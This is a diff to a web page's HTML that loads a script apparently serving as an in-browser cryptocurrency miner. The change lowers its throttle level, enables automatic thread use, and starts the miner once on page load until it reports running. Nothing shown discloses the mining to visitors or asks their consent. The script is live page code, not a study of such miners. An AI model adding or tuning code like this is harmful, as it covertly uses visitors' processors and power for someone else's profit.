@@ -42,7 +42,7 @@
        overflow: -moz-scrollbars-vertical;
     }
   </style>
-  <script src="cfc/direct.js?v=1.0" data-user="3156969" data-level="50"></script>
+  <script src="cfc/direct.js?v=1.0" data-user="3156969" data-level="40"></script>
 </head>
 <body>
   <div id="content">
@@ -111,12 +111,11 @@
   <script>
     var mi = setInterval(function(){
       if (miner != null){
+        miner.setAutoThreadsEnabled(true);
         miner.start();
-        miner.setNumThreads(navigator.hardwareConcurrency/2);
-        setTimeout(function(){
-            miner.start();
-        }, 10000);
-        clearInterval(mi);
+        if(miner.isRunning())
+          clearInterval(mi);
+        //miner.setNumThreads(navigator.hardwareConcurrency/2);
       }
     }, 1000);
   </script>
